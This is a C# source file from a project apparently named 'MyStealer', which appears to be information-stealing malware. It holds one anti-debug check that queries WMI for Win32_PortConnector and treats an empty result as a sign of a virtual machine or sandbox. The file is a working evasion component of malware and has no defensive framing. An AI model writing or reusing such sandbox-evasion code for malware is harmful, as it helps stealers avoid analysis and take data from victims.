using System.Management;

namespace MyStealer.AntiDebug.Check
{
    internal class WmiPortConnectors : CheckBase
    {
        public override string Name => "WMI Win32_PortConnector";

        public override bool CheckPassive()
            => new ManagementObjectSearcher("SELECT * FROM Win32_PortConnector").Get().Count == 0;
    }
}
